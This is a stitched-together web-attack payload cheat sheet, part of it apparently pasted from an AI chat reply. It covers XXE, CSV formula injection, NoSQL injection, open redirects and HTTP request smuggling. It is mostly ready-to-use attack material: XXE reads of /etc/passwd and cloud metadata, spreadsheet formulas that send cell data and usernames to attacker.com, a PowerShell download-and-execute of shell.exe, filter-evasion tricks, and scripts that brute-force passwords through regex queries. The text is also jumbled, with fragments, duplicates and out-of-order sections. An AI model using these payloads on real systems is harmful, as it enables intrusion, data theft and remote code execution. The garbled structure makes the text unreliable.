<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://yourdomain.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>123</productId></stockCheck>
```
### 3. SSRF via Metadata Service  
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
### 4. Base64 File Read via PHP Filter  
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&xxe;</data>
```
### 5. Parameter Entity for Blind XXE  
```xml
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://yourdomain.com"> %xxe; ]>
<stockCheck><productId>3</productId></stockCheck>
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
<stockCheck><productId>3</productId></stockCheck>
```
### 6. Billion Laughs DoS  
```xml
<!DOCTYPE lolz [
  <!ENTITY a0 "LOL">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
]>
<data>&a3;</data>
```
### XXE PHP Wrapper
```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <adress>42 rue du CTF</adress>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

* **1.1 Classic External Entity Injection**
  Loading external files via `<!ENTITY>`.

### **2.1 Basic XXE – File Read**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### **2.2 SSRF via XXE**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root>&xxe;</root>
```

### **2.3 Blind XXE (DNS/HTTP Ping)**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://abc.your-callback-domain.com/">
]>
<data>&xxe;</data>
```

### **2.4 Billion Laughs (DoS Example)**

```xml
<!DOCTYPE lolz [
 <!ENTITY a "123">
 <!ENTITY b "&a;&a;">
 <!ENTITY c "&b;&b;">
]>
<data>&c;</data>
```
### **3.4 External DTD Bypass**

Hosted malicious DTD:

```xml
<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
<root>test</root>
```

`malicious.dtd`:

```xml
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY data "%xxe;">
```

### **3.5 Encoding Bypass**

```xml
<!DOCTYPE %25foo [
  <!ENTITY %25xxe SYSTEM "file:///etc/passwd">
]>
```
# CSV Injection (Formula Injection)

## Overview
CSV Injection, also known as Formula Injection, occurs when an application allows users to export data into an Excel file (CSV format) that contains malicious formulas. When the exported file is opened in spreadsheet software, the formulas can execute arbitrary commands on the system.

## Steps to Test for CSV Injection
1. Select any parameter that is part of the Excel sheet to be downloaded.
2. Modify values in these fields to insert malicious formulas (e.g., First Name, Last Name, Amount, Title, Status, etc.).
3. Download the Excel file and open it.
4. If the injected formula executes (e.g., launches the calculator), the application is vulnerable.

## Example Payloads
### Pop Calculator
```csv
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
=1+1
=cmd|' /C calc'!A0
=HYPERLINK("http://attacker.com","Click")
=WEBSERVICE("http://attacker.com/p?x="&A1)
=HYPERLINK("http://malicious.com")
@SUM(1,2)
+SUM(5,5)
-SUM(10,10)
=SUM(9,9)
\t=1+2
"=HYPERLINK(""http://evil.com"")"
=1+1;WEBSERVICE("http://attacker.com")
=BASE64DECODE("PT1TVU0oMSwyKQ==")
=CHAR(72)&CHAR(84)&CHAR(84)&CHAR(80)
=1+1
=2+2
="test"
+1+1
@1+1
=cmd|' /C calc'!A0
=cmd|' /C whoami'!A0
=cmd|' /C dir'!A0
=HYPERLINK("http://attacker.com/?data="&A1)
=WEBSERVICE("http://attacker.com")
=IMPORTXML("http://attacker.com","//data")
=INFO("system")
=USER()
=CELL("filename")
%3D1%2B1
%3Dcmd%7C...
\u003d1+1
```
```

### Pop Notepad
```csv
=cmd|' /C notepad'!'A1'
```

### PowerShell Download and Execute
```csv
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

### Metasploit SMB Delivery with rundll32
```csv
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
# 🔹 Basic CSV Injection Payloads

Simple Formula Execution : `=2+2` → Executes formula when opened in Excel  
String Formula : `="Injected"` → Confirms formula parsing  
Addition Test : `=1+1` → Returns `2`, confirms injection

# 🔹 Command Execution (Excel / DDE)

DDE Command (Windows): `=cmd|' /C calc'!A0` → Opens calculator (older Excel versions)
PowerShell Execution : `=cmd|' /C powershell.exe'!A0` → Executes PowerShell
Remote Command Execution : `=cmd|' /C curl attacker.com'!A0` → Sends request to attacker

# 🔹 Data Exfiltration Payloads

HTTP Exfiltration :  `=HYPERLINK("http://attacker.com/?data="&A1)` → Sends cell data
Steal Username :  `=HYPERLINK("http://attacker.com/?user="&USER())`
DNS Exfiltration :  `=HYPERLINK("http://"&A1&".attacker.com")`
External Data Fetch + Remote URL Load :  `=WEBSERVICE("http://attacker.com")` → Triggers external request

# 🔹 Information Disclosure

System Info :  `=INFO("system")` → Retrieves system details
User Info :  `=USER()` → Current username
File Paths :  `=CELL("filename")` → Reveals file location
Malicious Link :  `=HYPERLINK("http://evil.com","Click Me")` → Triggers phishing
Fake Login Prompt :  `=HYPERLINK("http://evil.com/login","Secure Login")`

# 🔹 CSV Injection via Prefix Characters

Formula Prefix : `=cmd` → Standard execution  
Alt Prefix : `+cmd` → Executes in Excel  
Minus Prefix : `-cmd` → Formula execution  
At Symbol : `@cmd` → Works in some spreadsheet apps

# 🔹 Context Breaking Payloads

Cell Escape :  `",=cmd|' /C calc'!A0,"` → Break CSV structure
New Row Injection :  `value\n=cmd|' /C calc'!A0` → Inject new row
Column Break :  `value,=cmd|' /C calc'!A0` → New column injection

# 🔹 WAF Bypass Techniques (CSV Injection)
## 🧩 Formula Obfuscation

Whitespace Trick : `= 1 + 1` → Bypass strict filters  
Tab Injection : `=\t1+1` → Hidden execution  
Newline Injection : `=\n1+1`

## 🧩 Encoding Tricks

URL Encoding : `%3Dcmd%7C%27%20/C%20calc%27!A0` → Encoded payload  
Double Encoding : `%253Dcmd%257C...` → WAF bypass  
Unicode Encoding : `\u003dcmd|' /C calc'!A0`

## 🧩 String Concatenation

String Split :  `="cm"&"d|' /C calc'!A0"` → Avoid detection
Character Build :  `=CHAR(99)&CHAR(109)&CHAR(100)` → Builds "cmd"
Join Trick :  `=CONCAT("c","md")`

## 🧩 Prefix Bypass

Space Prefix : `" =cmd|' /C calc'!A0"` → Bypass strict checks  
Quote Prefix : `'=cmd|' /C calc'!A0` → Still executes in some cases

## 🧩 Function Obfuscation

Indirect Call :  `=INDIRECT("A1")` → Execute indirectly
Nested Function :  `=HYPERLINK("http://evil.com","Click")`

# NoSQL Injection

> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Operator Injection](#operator-injection)
    * [Authentication Bypass](#authentication-bypass)
    * [Extract Length Information](#extract-length-information)
    * [Extract Data Information](#extract-data-information)
    * [WAF and Filters](#waf-and-filters)
* [Blind NoSQL](#blind-nosql)
    * [POST with JSON Body](#post-with-json-body)
    * [POST with urlencoded Body](#post-with-urlencoded-body)
    * [GET](#get)
* [Labs](#references)
* [References](#references)

## Tools

* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool
* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection
* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities.

## Methodology

NoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.

### Operator Injection

| Operator | Description        |
| -------- | ------------------ |
| $ne      | not equal          |
| $regex   | regular expression |
| $gt      | greater than       |
| $lt      | lower than         |
| $nin     | not in             |

Example: A web application has a product search feature

```js
db.products.find({ "price": userInput })
```

An attacker can inject a NoSQL query: `{ "$gt": 0 }`.

```js
db.products.find({ "price": { "$gt": 0 } })
```
# ✅ **NoSQL Injection – Complete Test Case (with Bypass Cases)**

### **1.1 Boolean-Based NoSQL Injection**

Injecting `$ne`, `$gt`, `$exists` etc. to force conditions to always evaluate to true.

### **1.2 Query Operator Injection**

Manipulating backend JSON queries using `$ne`, `$in`, `$regex`, `$eq`, `$or`, `$and`, etc.

### **1.3 Authentication Bypass**

Bypassing login by injecting operators so password validation is skipped.

### **1.4 Regex-Based Injection**

Using wildcard regex like `.*` or `^` to match any username or password.

### **1.5 Blind NoSQL Injection**

Observing response/time differences to extract data without direct output.

### **1.6 Projection Manipulation**

Injecting projection modifiers to expose hidden fields or bypass restrictions.

### **1.7 $where JavaScript Injection (MongoDB)**

Injecting JavaScript expressions when `$where` is enabled in backend queries.

### **1.8 Array-Based Injection**

Sending arrays instead of strings to break query logic or force unintended matches.

### **1.9 Type Confusion Injection**

Exploiting loosely typed fields (string vs number vs boolean) to bypass conditions.

### **1.10 Privilege Escalation via Filter Tampering**

Manipulating role or access filters to escalate privileges.

---

# **2. Sample Payloads (Test Inputs)**

Below are safe, defensive sample payloads showing where injection can occur.

---

### **2.1 Basic Operator Injection**

```
username=admin&password[$ne]=null
```

```
{ "username": { "$ne": null }, "password": { "$ne": null } }
```

---

### **2.2 Authentication Bypass Payloads**

```
username=admin&password[$gt]=0
```

```
password[$exists]=true
```

---

### **2.3 Regex Injection**

```
username=admin&password[$regex]=.*
```

```
password[$regex]=^a
```

---

### **2.4 Blind Injection Payloads**

```
username=admin&password[$regex]=^(?=.{1,}).*
```

Timing-based:

```
$where=sleep(5000)
```

---

### **2.5 $where JavaScript Injection**

```
{"$where": "this.password.length > 0"}
```

```
{"$where": "function() { return true; }"}
```

---

### **2.6 Array-Based Injection**

```
username[]=admin
```

```
password[]=123
```

---

### **2.7 Type Confusion Payloads**

```
username=true
```

```
password=0
```

---

### **2.8 Privilege Escalation Payloads**

```
role[$ne]=user
```

```
{"role": {"$in": ["admin", "superuser"]}}
```

---

# **3. Bypass Techniques (Advanced)**

These mimic real-world bypass approaches used against weak NoSQL filters.

---

### **3.1 Operator Obfuscation Bypass**

```
password[%24ne]=null
```

```
password[$n%e]=null
```

---

### **3.2 JSON Structure Manipulation**

```
{ "username": "admin", "$or": [ {}, { "password": { "$ne": "test" } } ] }
```

---

### **3.3 Array Injection Bypass**

```
username=admin&password[$in][]=anything
```

---

### **3.4 Encoded Injection**

URL-encoded:

```
password%5B%24ne%5D=null
```

Double-encoded:

```
password%255B%2524ne%255D=null
```

---

### **3.5 Regex Bypass Variants**

```
password[$regex]=.*
password[$regex]=^.*
password[$regex]=(?s).*
password[$regex]=.{0,100}
```

---

### **3.6 JavaScript Bypass (MongoDB)**

```
$where=1==1
```

```
$where=function(){return(true);}
```

---

### **3.7 Numeric/String Type Abuse**

```
"role": 1
```

```
"role": "1"
```

Backend may treat numbers as admin flags.

---

### **3.8 Boolean-Type Bypass**

```
"username": true
```

```
"password": false
```

---

### **3.9 Logical Injection ($or / $and)**

```
{ "$or": [ { "username": "admin" }, { "username": { "$ne": null } } ] }
```

```
{ "$and": [ { "role": "user" }, { "role": { "$ne": "user" } } ] }
```

---

### **3.10 Null Injection**

```
{ "username": null }
```

Sometimes matches everything due to weak matching.

---

# **4. Combined Master Payload (All-In-One Fuzzer)**

Single payload for broad test coverage.

```
username=admin
password[$ne]=null
password[$regex]=.*
role[$in][]=admin
$where=function(){return true;}
```

Instead of returning a specific product, the database returns all products with a price greater than zero, leaking data.

### Authentication Bypass

Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)

* HTTP data

  ```ps1
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
  ```

* JSON data

  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
  ```

### Extract Length Information

Inject a payload using the $regex operator. The injection will work when the length is correct.

```ps1
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### Extract Data Information

Extract data with "`$regex`" query operator.

* HTTP data

  ```ps1
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
  ```

* JSON data

  ```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
  ```

Extract data with "`$in`" query operator.

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### WAF and Filters

**Remove pre-condition**:

In MongoDB, if a document contains duplicate keys, only the last occurrence of the key will take precedence.

```js
{"id":"10", "id":"100"} 
```

In this case, the final value of "id" will be "100".

## Blind NoSQL

### POST with JSON Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

### POST with urlencoded Body

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

### GET

Python script:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

Ruby script:

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # all ASCII printable characters
CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```
---------
### Classic XXE

# Open URL Redirect
## Summary

* [Methodology](#methodology)
    * [HTTP Redirection Status Code](#http-redirection-status-code)
    * [Redirect Methods](#redirect-methods)
        * [Path-based Redirects](#path-based-redirects)
        * [JavaScript-based Redirects](#javascript-based-redirects)
        * [Common Query Parameters](#common-query-parameters)
    * [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)

## Methodology

An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.

Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.

**Example**: A web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

An attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.


## HTTP Redirection Status Code

HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:

- [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
- [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
- [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
- [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
- [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
- [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource must be accessed through a proxy provided in the Location header. 
- [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
- [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.


## Redirect Methods

### Path-based Redirects

Instead of query parameters, redirection logic may rely on the path:

* Using slashes in URLs: `https://example.com/redirect/http://malicious.com`
* Injecting relative paths: `https://example.com/redirect/../http://malicious.com`


### JavaScript-based Redirects

If the application uses JavaScript for redirects, attackers may manipulate script variables:

**Example**:

```js
var redirectTo = "http://trusted.com";
window.location = redirectTo;
```

**Payload**: `?redirectTo=http://malicious.com`


### Common Parameters

```powershell
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```


## Filter Bypass

* Using a whitelisted domain or keyword
    ```powershell
    www.whitelisted.com.evil.com redirect to evil.com
    ```

* Using **CRLF** to bypass "javascript" blacklisted keyword
    ```powershell
    java%0d%0ascript%0d%0a:alert(0)
    ```

* Using "`//`" and "`////`" to bypass "http" blacklisted keyword
    ```powershell
    //google.com
    ////google.com
    ```

* Using "https:" to bypass "`//`" blacklisted keyword
    ```powershell
    https:google.com
    ```

* Using "`\/\/`" to bypass "`//`" blacklisted keyword
    ```powershell
    \/\/google.com/
    /\/google.com/
    ```

* Using "`%E3%80%82`" to bypass "." blacklisted character
    ```powershell
    /?redir=google。com
    //google%E3%80%82com
    ```

* Using null byte "`%00`" to bypass blacklist filter
    ```powershell
    //google%00.com
    ```

* Using HTTP Parameter Pollution
    ```powershell
    ?next=whitelisted.com&next=google.com
    ```

* Using "@" character. [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)
    ```powershell
    //<user>:<password>@<host>:<port>/<url-path>
    http://www.theirsite.com@yoursite.com/
    ```

* Creating folder as their domain
    ```powershell
    http://www.yoursite.com/http://www.theirsite.com/
    http://www.yoursite.com/folder/www.folder.com
    ```

* Using "`?`" character, browser will translate it to "`/?`"
    ```powershell
    http://www.yoursite.com?http://www.theirsite.com/
    http://www.yoursite.com?folder/www.folder.com
    ```

* Host/Split Unicode Normalization
    ```powershell
    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
    http://a.com／X.b.com
    ```


## Labs

* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)


## References

- [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
- [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://s0cket7.com/open-redirect-vulnerability/)
- [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
- [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
- [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)

---

# Request Smuggling

> HTTP Request smuggling occurs when multiple "things" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.

Absolutely, Anvesh! Here's a **complete and actionable HTTP Request Smuggling test case list** with sample payloads, aligned with your GitHub methodology and designed for direct use in manual testing, Burp Suite, or Smuggler automation.

---

## 🧪 HTTP Request Smuggling Test Cases with Payloads

---

### **1. CL.TE (Content-Length vs Transfer-Encoding)**
- Front-end honors `Content-Length`, back-end honors `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /malicious HTTP/1.1
Host: vulnerable.com
```

---

### **2. TE.CL (Transfer-Encoding vs Content-Length)**
- Front-end honors `Transfer-Encoding`, back-end honors `Content-Length`.

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 6

5
GPOST /evil HTTP/1.1
Host: vulnerable.com

0
```

---

### **3. TE.TE (Dual Transfer-Encoding headers)**
- Conflicting `Transfer-Encoding` headers cause ambiguity.

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Transfer-Encoding : chunked

0

GET /next HTTP/1.1
Host: vulnerable.com
```

---

### **4. CL.CL (Dual Content-Length headers)**
- Desync via conflicting `Content-Length` values.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 10
Content-Length: 4

GET /hidden HTTP/1.1
```

---

### **5. CL.0 (Zero-Length Content Body)**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 0

GET /inject HTTP/1.1
Host: vulnerable.com
```

---

### **6. TE.0 (Zero chunk with extra body)**

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked

0

GET /afterchunk HTTP/1.1
Host: vulnerable.com
```

---

### **7. Mixed Case Header Bypass**

```http
POST / HTTP/1.1
Host: vulnerable.com
transfer-encoding: chunked

0

GET /casebypass HTTP/1.1
Host: vulnerable.com
```

---

### **8. Space/Tab Injection in Header**

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding : chunked

0

GET /spaceinject HTTP/1.1
Host: vulnerable.com
```

---

### **9. Line Ending Abuse (`\r\n`, `\r`, `\n`)**

```http
POST / HTTP/1.1\r\n
Host: vulnerable.com\r\n
Transfer-Encoding: chunked\r
\n
0\r\n
GET /newline HTTP/1.1\r\n
Host: vulnerable.com\r\n
```

---

### **10. Chunk Size Manipulation**

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked

3
GET
0

GET /chunkinject HTTP/1.1
Host: vulnerable.com
```

---

### **11. Keep-Alive Poisoning**

```http
POST / HTTP/1.1
Host: vulnerable.com
Connection: keep-alive
Content-Length: 13

GET /poison HTTP/1.1
Host: vulnerable.com
```

---

### **12. Front-End Timeout Delay**
- Send partial request, delay second part.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 20

GET /timeout HTTP/1.1
Host: vulnerable.com
```

---

### **13. Header Injection Smuggling**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50

GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-For: evil.com
```

---

### **14. Method Override Smuggling**

```http
GET / HTTP/1.1
Host: vulnerable.com
Content-Length: 15

POST /admin HTTP/1.1
Host: vulnerable.com
```

---

### **15. Path Override Smuggling**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 20

GET /admin HTTP/1.1
Host: vulnerable.com
```

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [CL.TE Vulnerabilities](#clte-vulnerabilities)
    * [TE.CL Vulnerabilities](#tecl-vulnerabilities)
    * [TE.TE Vulnerabilities](#tete-vulnerabilities)
    * [HTTP/2 Request Smuggling](#http2-request-smuggling)
    * [Client-Side Desync](#client-side-desync)
* [Labs](#labs)
* [References](#references)

## Tools

* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - An extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks
* [defparam/Smuggler](https://github.com/defparam/smuggler) - An HTTP Request Smuggling / Desync testing tool written in Python 3
* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs.

## Methodology

If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as PortSwigger suggests `Manually fixing the length fields in request smuggling attacks can be tricky.`.

### CL.TE Vulnerabilities

> The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL Vulnerabilities

> The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Example:

```powershell
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

:warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.You need to include the trailing sequence `\r\n\r\n` following the final 0.

### TE.TE Vulnerabilities

> The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

## HTTP/2 Request Smuggling

HTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header

```ps1
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

## Client-Side Desync

On some paths, servers don't expect POST requests, and will treat them as simple GET requests, ignoring the payload, eg:

```ps1
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

could be treated as two requests when it should only be one. When the backend server responds twice, the frontend server will assume only the first response is related to this request.

To exploit this, an attacker can use JavaScript to trigger their victim to send a POST to the vulnerable site:

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

This could be used to:

* get the vulnerable site to store a victim's credentials somewhere the attacker can access it
* get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)
* to get the victim to run arbitrary JavaScript as if it were from the site

**Example**:

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
        location = 'https://www.example.com/'
})
```

This script tells the victim browser to send a `POST` request to `www.example.com/redirect`. That returns a redirect which is blocked by CORS, and causes the browser to execute the catch block, by going to `www.example.com`.

